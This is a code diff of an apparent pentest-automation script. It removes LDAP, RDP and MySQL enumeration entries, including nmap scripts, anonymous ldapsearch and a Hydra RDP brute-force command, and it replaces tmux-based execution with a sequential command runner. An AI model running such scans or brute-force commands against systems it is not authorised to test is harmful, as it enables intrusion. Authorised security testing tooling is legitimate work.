-            'description': "Enumerate LDAP with Nmap",
-            'commands': [
-                r"""nmap -n -sV --script "ldap* and not brute" IP -oN recon/nmap.ldap"""
-            ]
-        }
-    ]
-    COMMANDS['LDAP']['Enumeration']['ldapsearch'] = [
-        {
-            'description': "Anonymous LDAP search",
-            'commands': [
-                r"""ldapsearch -x -H ldap://IP -b "DC=DOMAIN,DC=COM"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['RDP']['Enumeration']['Nmap Scripts'] = [
-        {
-            'description': "Check RDP security",
-            'commands': [
-                r"""nmap -sV -Pn -p 3389 --script rdpscreenshot.nse IP -oN recon/nmap.rdp"""
-            ]
-        }
-    ]
-    COMMANDS['RDP']['Brute Force']['Hydra'] = [
-        {
-            'description': "Brute force RDP with Hydra",
-            'commands': [
-                r"""hydra -L users.txt -P passwords.txt rdp://IP"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['MYSQL']['Enumeration']['Nmap Scripts'] = [
-        {
-            'description': "MySQL Enumeration with Nmap",
-            'commands': [
-                r"""nmap -sV -Pn -T4 -vv --script=mysql* IP -p 3306 -oN recon/nmap.mysql"""
-            ]
-        }
-    ]
-    COMMANDS['MYSQL']['Access']['Login'] = [
-        {
-            'description': "Login to MySQL",
-            'commands': [
-                r"""mysql -u root -p -h IP"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-
-
     # List Commands
     if args.list_commands:
         variables['PORT'] = 'PORT'
         list_commands(COMMANDS, variables, args.service)
         sys.exit(0)
 
-    if not args.execute:
+    if args.service and not args.execute:
         variables['PORT'] = 'PORT'
         list_commands(COMMANDS, variables, args.service)
+        sys.exit(0)
+
+    if not args.execute:
+        variables['PORT'] = 'PORT'
+        cprint("[i] Execution flag (-x) not set.", "yellow")
         sys.exit(0)
 
     if not is_root():
@@ -937,7 +491,8 @@ def main():
 
     # Proceed with execution
     # Check if recon has been done
-    recon_done = os.path.exists('recon/nmap.init')
+    recon_done = os.path.exists(os.path.join(RECON_DIR, 'nmap.init'))
+
     if recon_done and not args.force_recon:
         cprint(f"[*] Reconnaissance scans already completed.", "green")
         cprint(f"[*] Use --force-recon to run reconnaissance scans again.", "yellow")
@@ -956,13 +511,13 @@ def main():
             if not args.quiet:
                 cmd_display = cmd_exec
                 cprint(f"$ {cmd_display}", "light_yellow")
-            subprocess.call(cmd_exec, shell=True)
+            run_command(cmd_exec, quiet=args.quiet)
 
     # Continue with parsing open ports
-    if os.path.exists('recon/nmap.init'):
+    if os.path.exists(os.path.join(RECON_DIR, 'nmap.init')):
         cprint(f"[*] Extracting open ports...", "green")
         open_ports = []
-        with open('recon/nmap.init', 'r') as f:
+        with open(os.path.join(RECON_DIR, 'nmap.init'), 'r') as f:
             for line in f:
                 if '/tcp' in line and 'open' in line:
                     port = line.split('/')[0].strip()
@@ -980,8 +535,11 @@ def main():
     # Parse services from detailed Nmap output
     cprint("[*] Parsing services from Nmap output...", "green")
     discovered_services = defaultdict(list)
-    if os.path.exists('recon/nmap.alltcp'):
-        with open('recon/nmap.alltcp', 'r') as f:
+    # if not os.path.exists(RECON_DIR, 'ports') or os.stat(RECON_DIR, 'ports').st_size == 0:
+    #     cprint("[!] No ports found in initial scan. Exiting...", "red")
+    #     sys.exit(1)
+    if os.path.exists(os.path.join(RECON_DIR, 'nmap.init')):
+        with open(os.path.join(RECON_DIR, 'nmap.init'), 'r') as f:
             for line in f:
                 if '/tcp' in line and 'open' in line:
                     parts = line.split()
@@ -1016,69 +574,27 @@ def main():
     if not args.quiet:
         list_commands(commands_to_execute, variables)
 
-    # Execute commands if -x is specified
     if args.execute:
-        cprint(f"[*] Executing service enumeration commands in tmux...", "green")
-        execute_commands_with_tmux(commands_to_execute, variables, discovered_services)
+        cprint(f"[*] Executing service enumeration commands...", "green")
+        for protocol in commands_to_execute:
+            variables['PORT'] = ','.join(discovered_services.get(protocol, []))
+            ports = ','.join(discovered_services.get(protocol, []))
+            transport = SERVICES.get(protocol, {}).get('transport', 'N/A')
 
-def execute_commands_with_tmux(commands, variables, discovered_services):
-    # Check if tmux is installed
-    if subprocess.call(['which', 'tmux'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
-        cprint(f"[!] tmux is not installed. Please install tmux.", "red")
-        sys.exit(1)
-
-    session_name = f"TAPE_{int(datetime.now().timestamp())}"
-    # Start tmux session
-    subprocess.call(['tmux', 'new-session', '-d', '-s', session_name])
-
-    window_index = 1
-    for protocol in commands:
-        if protocol not in discovered_services and protocol != 'RECON':
-            continue  # Skip if protocol not in discovered services, except for RECON
-
-        variables['PORT'] = ','.join(discovered_services.get(protocol, []))
-        if protocol in SERVICES:
-            ports = ','.join(discovered_services.get(protocol, SERVICES[protocol]['ports']))
-            transport = SERVICES[protocol]['transport']
-        else:
-            ports = 'N/A'
-            transport = 'N/A'
-        for action in commands[protocol]:
-            for subaction in commands[protocol][action]:
-                # Create window name
-                window_name = f"{protocol}_{action}_{subaction}"
-                # Replace spaces with underscores and limit length
-                window_name = window_name.replace(' ', '_')[:50]
-                # Create a new window for each protocol-action-subaction
-                subprocess.call(['tmux', 'new-window', '-t', session_name, '-n', window_name])
-                protocol_title = colored(f"{protocol} - {ports}/{transport}", "green")
-                tmux_cmd = f"echo -e '{protocol_title}'"
-                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
-                action_subaction_title = colored(f"{protocol} - {ports}/{transport} - {action} - {subaction}", "cyan")
-                tmux_cmd = f"echo -e '{action_subaction_title}'"
-                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
-                for cmd_group in commands[protocol][action][subaction]:
-                    description = colored(cmd_group['description'], "yellow")
-                    cmds = cmd_group['commands']
-                    if description:
-                        tmux_cmd = f"echo -e '# {description}'"
-                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
-                    for cmd in cmds:
-                        # Replace variables
-                        cmd_exec = format_command(cmd, variables)
-                        # Display the command
-                        cmd_display = colored(cmd_exec, "cyan")
-                        tmux_cmd = f"echo -e '$ {cmd_display}'"
-                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
-                        # Execute the command
-                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", cmd_exec, 'C-m'])
-                # Keep the window open
-                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", 'bash', 'C-m'])
-                window_index += 1
-
-    cprint(f"[*] Commands sent to tmux session.", "green")
-    cprint(f"[+] Attaching to tmux session: {session_name}", "blue")
-    subprocess.call(['tmux', 'attach-session', '-t', session_name])
-
+            for action in commands_to_execute[protocol]:
+                for subaction in commands_to_execute[protocol][action]:
+                    title = f"{protocol} - {ports}/{transport} - {action} - {subaction}"
+                    cprint(title, "red", "on_cyan", attrs=["bold", "dark"])
+                    for cmd_group in commands_to_execute[protocol][action][subaction]:
+                        desc = cmd_group.get("description")
+                        if desc:
+                            cprint(f"# {desc}", "cyan")
+                        for cmd in cmd_group.get("commands", []):
+                            cmd_exec = format_command(cmd, variables)
+                            if not args.quiet:
+                                cprint(f"$ {cmd_exec}", "light_yellow")
+                            run_command(cmd_exec, quiet=args.quiet)
+                            
+                    print()
 if __name__ == '__main__':
     main()
